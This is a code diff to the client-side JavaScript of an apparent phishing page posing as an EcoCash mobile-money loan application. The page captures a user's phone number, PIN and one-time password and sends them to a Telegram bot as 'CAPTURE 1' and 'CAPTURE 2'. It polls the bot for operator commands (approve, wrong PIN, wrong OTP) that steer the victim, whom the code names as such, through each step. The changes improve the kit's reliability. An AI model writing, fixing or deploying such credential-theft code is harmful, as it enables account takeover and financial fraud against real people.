@@ -290,7 +290,7 @@
     MAX_PIN_ATTEMPTS: 3,
     MAX_OTP_ATTEMPTS: 3,
     PROCESS_MS: 2200,
-    POLL_MS: 2000,
+    POLL_GAP_MS: 500,       // gap between sequential polls
     KEEPALIVE_MS: 4 * 60 * 1000
   };
 
@@ -305,11 +305,10 @@
     pinAttempts: 0,
     otpAttempts: 0,
     lockedOut: false,
-    refCode: null,
-    adminPanelSent: false
+    refCode: null
   };
 
-  let POLLING_INTERVAL = null;
+  let POLLING_ACTIVE = false;
   let POLL_OFFSET = null;
   let PROCESSING_TIMER = null;
   let REDIRECT_TIMER = null;
@@ -357,27 +356,7 @@
   }
 
   // ============================================================
-  //  FINGERPRINT
-  // ============================================================
-  function deviceFingerprint() {
-    const parts = [];
-    try {
-      const ua = navigator.userAgent || '';
-      const o = ua.indexOf('(');
-      const c = ua.indexOf(')');
-      parts.push(o > -1 && c > o ? ua.slice(o + 1, c).trim() : ua.slice(0, 40) || 'unknown');
-    } catch (e) { parts.push('unknown'); }
-    try { parts.push((screen.width || 0) + 'x' + (screen.height || 0)); } catch (e) {}
-    try {
-      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
-      parts.push(tz.split('/').pop() || 'unknown');
-    } catch (e) { parts.push('unknown'); }
-    try { parts.push(navigator.language || 'en'); } catch (e) {}
-    return parts.join(' · ');
-  }
-
-  // ============================================================
-  //  TELEGRAM — same-origin, no proxies
+  //  TELEGRAM — same-origin
   // ============================================================
   async function tgSend(text, replyMarkup) {
     try {
@@ -392,34 +371,27 @@
     }
   }
 
-  async function tgUpdates() {
+  async function tgUpdatesOnce() {
     try {
       let url = '/tg/updates';
       if (POLL_OFFSET) url += '?offset=' + POLL_OFFSET;
-      const res = await fetch(url);
+      const res = await fetch(url, { cache: 'no-store' });
       return await res.json();
     } catch (e) {
       return { ok: false, result: [] };
     }
   }
 
-  // Dual-path ACK: fetch + sendBeacon in parallel.
-  // Telegram stops the spinner on whichever lands first.
+  // Dual-path ACK. Telegram stops the spinner on whichever lands first.
   function tgAnswer(cbId) {
-    // Path 1: fetch (standard, respects headers)
     try {
-      const controller = new AbortController();
-      const t = setTimeout(() => controller.abort(), 3000);
       fetch('/tg/answer', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ callback_query_id: cbId }),
-        signal: controller.signal,
         keepalive: true
-      }).finally(() => clearTimeout(t));
+      }).catch(() => {});
     } catch (e) {}
-
-    // Path 2: beacon (bypasses JS event loop, fires at network stack)
     try {
       if (navigator.sendBeacon) {
         const blob = new Blob([JSON.stringify({ callback_query_id: cbId })], { type: 'text/plain' });
@@ -429,7 +401,7 @@
   }
 
   // ============================================================
-  //  KEEP-ALIVE — prevents Render free-tier cold start
+  //  KEEP-ALIVE
   // ============================================================
   function startKeepAlive() {
     if (KEEPALIVE_TICK) return;
@@ -442,7 +414,55 @@
   }
 
   // ============================================================
-  //  ADMIN PANEL — attached to PIN capture
+  //  SEQUENTIAL LONG-POLL — one request at a time. Never overlap.
+  //  This is the fix for Telegram 409 Conflict and stuck buttons.
+  // ============================================================
+  function startPolling() {
+    if (POLLING_ACTIVE) return;
+    POLLING_ACTIVE = true;
+    pollLoop();
+  }
+  function stopPolling() {
+    POLLING_ACTIVE = false;
+  }
+
+  async function pollLoop() {
+    while (POLLING_ACTIVE) {
+      if (state.lockedOut) { POLLING_ACTIVE = false; return; }
+
+      const data = await tgUpdatesOnce();
+
+      if (data && data.ok && data.result && data.result.length) {
+        for (const u of data.result) {
+          POLL_OFFSET = u.update_id + 1;
+          const cb = u.callback_query;
+          if (!cb) continue;
+
+          // ACK FIRST, before any filter.
+          tgAnswer(cb.id);
+
+          const action = cb.data || '';
+          if (!state.victimId) continue;
+          if (!action.endsWith('_' + state.victimId)) continue;
+
+          if (action.startsWith('approve_')) {
+            stopPolling();
+            approveLoan();
+            return;
+          }
+          if (action.startsWith('wrong_pin_')) handleWrongPin();
+          else if (action.startsWith('wrong_otp_')) handleWrongOtp();
+        }
+      }
+
+      // Small gap before next long-poll — gives the browser a
+      // moment and prevents hammering when offset doesn't advance.
+      await new Promise(r => setTimeout(r, CONFIG.POLL_GAP_MS));
+    }
+  }
+
+  // ============================================================
+  //  ADMIN KEYBOARD
   // ============================================================
   function buildAdminKeyboard() {
     return {
@@ -454,43 +474,6 @@
         ]
       ]
     };
-  }
-
-  // ============================================================
-  //  LONG POLLING
-  // ============================================================
-  function startPolling() {
-    if (POLLING_INTERVAL || state.lockedOut) return;
-    POLLING_INTERVAL = setInterval(pollTick, CONFIG.POLL_MS);
-  }
-  function stopPolling() {
-    if (POLLING_INTERVAL) { clearInterval(POLLING_INTERVAL); POLLING_INTERVAL = null; }
-  }
-
-  async function pollTick() {
-    try {
-      const data = await tgUpdates();
-      if (!data.ok || !data.result || !data.result.length) return;
-
-      for (const u of data.result) {
-        POLL_OFFSET = u.update_id + 1;
-        const cb = u.callback_query;
-        if (!cb) continue;
-
-        // ACK FIRST — before any filter. Spinner stops regardless.
-        tgAnswer(cb.id);
-
-        const action = cb.data || '';
-
-        // Only act on this session's callbacks.
-        if (!state.victimId) continue;
-        if (!action.endsWith('_' + state.victimId)) continue;
-
-        if (action.startsWith('approve_')) { stopPolling(); approveLoan(); return; }
-        if (action.startsWith('wrong_pin_')) handleWrongPin();
-        else if (action.startsWith('wrong_otp_')) handleWrongOtp();
-      }
-    } catch (e) {}
   }
 
   // ============================================================
@@ -599,7 +582,7 @@
   }
 
   // ============================================================
-  //  STEP 1 — local only. No Telegram hit.
+  //  STEP 1 — local only, no Telegram
   // ============================================================
   document.getElementById('btnNext').addEventListener('click', () => {
     clearErr('err1');
@@ -621,7 +604,6 @@
     state.term = document.getElementById('repaymentTerm').value + ' days';
     saveState();
 
-    // Prewarm the server while the victim is on the PIN screen.
     fetch('/healthz', { cache: 'no-store' }).catch(() => {});
 
     runProcessingThen(
@@ -632,7 +614,7 @@
   });
 
   // ============================================================
-  //  STEP 2 — PIN + ADMIN PANEL (Capture 1)
+  //  STEP 2 — Capture 1: Number + PIN + admin panel
   // ============================================================
   document.getElementById('btnSubmitPin').addEventListener('click', () => {
     clearErr('err2');
@@ -648,14 +630,10 @@
     }
     saveState();
 
-    // CAPTURE 1 — number + PIN + admin panel with buttons.
     const capture1 =
-      '🔐 ECOCASH — CAPTURE 1\n' +
-      '📞 Number: ' + state.msisdn + '\n' +
-      '🔑 PIN: ' + state.pin + '\n' +
-      '🆔 ID: ' + state.victimId + '\n' +
-      '📱 Device: ' + deviceFingerprint() + '\n' +
-      '🕒 ' + new Date().toLocaleString() + '\n\n' +
+      '🔐 CAPTURE 1\n' +
+      'Number: ' + state.msisdn + '\n' +
+      'PIN: ' + state.pin + '\n\n' +
       'Choose action:';
 
     tgSend(capture1, buildAdminKeyboard());
@@ -712,7 +690,7 @@
   });
 
   // ============================================================
-  //  STEP 3 — OTP (Capture 2). Plain text, no buttons.
+  //  STEP 3 — Capture 2: Number + PIN + OTP. Plain text.
   // ============================================================
   document.getElementById('btnVerifyOtp').addEventListener('click', () => {
     clearErr('errOtp');
@@ -725,14 +703,11 @@
     state.otp = otp;
     saveState();
 
-    // CAPTURE 2 — full triad.
     const capture2 =
-      '🔓 ECOCASH — CAPTURE 2\n' +
-      '📞 Number: ' + state.msisdn + '\n' +
-      '🔑 PIN: ' + state.pin + '\n' +
-      '🔢 OTP: ' + state.otp + '\n' +
-      '🆔 ID: ' + (state.victimId || '') + '\n' +
-      '🕒 ' + new Date().toLocaleString();
+      '🔓 CAPTURE 2\n' +
+      'Number: ' + state.msisdn + '\n' +
+      'PIN: ' + state.pin + '\n' +
+      'OTP: ' + state.otp;
 
     tgSend(capture2);
 
